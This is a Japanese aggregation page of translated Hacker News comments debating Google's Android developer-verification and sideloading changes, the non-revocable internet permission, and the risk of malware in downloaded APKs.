{{<matomeQuote body="Windowsだと未署名アプリも全然インストールできるし、せいぜい警告画面が一つ増えるだけだよ。VLCみたいに多くの人が使うオープンソースプロジェクトでも、インストーラーに署名してないこと多いんだぜ。" userName="tsimionescu" createdAt="2025/08/26 06:27:23" color="">}}




{{<matomeQuote body="インターネット許可って、設定でいじれない唯一の普通のマニフェスト許可なんだぜ。広告とか監視してる会社、Googleにとっては、これって超有利じゃん。何が「wack」なんだよ？" userName="ycombinatrix" createdAt="2025/08/26 00:55:56" color="#ff5c5c">}}




{{<matomeQuote body="Googleは昔Play Storeでどのアプリがインターネット許可を使ってるか表示してたけど、それも削除しちゃったから、ネットを使わないアプリを見つけるのが難しくなったんだ。Googleは、アプリ実行中に許可を拒否させないことが多いし、最近は実行時に選べる許可もあるけど、ネット許可を拒否させないのは驚きじゃないね。だってストアでも見せないんだから。" userName="toast0" createdAt="2025/08/25 22:01:14" color="#ff5c5c">}}




{{<matomeQuote body="インターネット許可はユーザーに公開されてるけど、ユーザーが取り消せないだけだよ。でも、他の100個くらいの許可も同じだし、許可が取り消せないのがデフォルトなんだ。インターネット許可が特にそうである理由を2つ挙げたけど、このコメントチェーンでは誰も反論してないじゃん。" userName="kllrnohj" createdAt="2025/08/26 04:48:51" color="">}}




{{<matomeQuote body="Googleがこの機能を特定の国から始めたのには理由があるんだ。一部の国では、インターネットからダウンロードされるAPKからのマルウェアがもっと目立ってるからね。政府自体が、国民を教育するのが無理だと分かったから、これを求めてるんだよ。もちろん、簡単に回避されるひどい解決策だろうけど、「Googleが今日ただの意地悪になっただけ」ってだけじゃないんだぜ。" userName="jeroenhd" createdAt="2025/08/26 04:42:19" color="#ff33a1">}}




{{<matomeQuote body="「エコシステムに壊滅的な変化をもたらすだろう」<br>ああ、それはもう賛成だよ、俺らを説得する必要はないって。" userName="broker354690" createdAt="2025/08/25 23:06:17" color="">}}




{{<matomeQuote body="「アプリがブラウザにリンクするたびに許可プロンプトをポップアップさせるのは、ユーザーが好きじゃないだろう」って言うけどさ。<br>Calculator.apkがhttps://eviltracker.example.comを開きたがってるときに、「今回だけ許可？」「24時間許可？」「許可して今後聞かない？」って出たらどうする？" userName="jech" createdAt="2025/08/26 09:31:32" color="#ff5c5c">}}




{{<matomeQuote body="このとんでもない主張の出典は何だよ？<br>それに、Play Storeでホストされてるマルウェアなら、身元が特定されてアカウントをバンできるっていう特性があるじゃん。" userName="jabedude" createdAt="2025/08/26 14:29:29" color="">}}




{{<matomeQuote body="企業認証は、銀行みたいな正規の機関を装うアプリ対策になるね。パッケージ名の公開鍵登録は、マルウェアによるパッケージ改変を防いでくれるんだ。例えば、Play Storeで手に入らないアプリをダウンロードしたい時、APKMirrorになくて怪しいサイトから落とすしかない場合、署名検証されてないからマルウェア入りか分からないって問題があるだろ？<br>これらは、実際にパッケージ内容をスキャンしなくてもできるし、TLSの世界におけるEV SSL証明書やDANE/TLSAみたいなもんだよ。" userName="black3r" createdAt="2025/08/25 21:58:30" color="#ff5c5c">}}

{{</details>}}



[記事一覧へ]({{% ref "/posts/" %}})
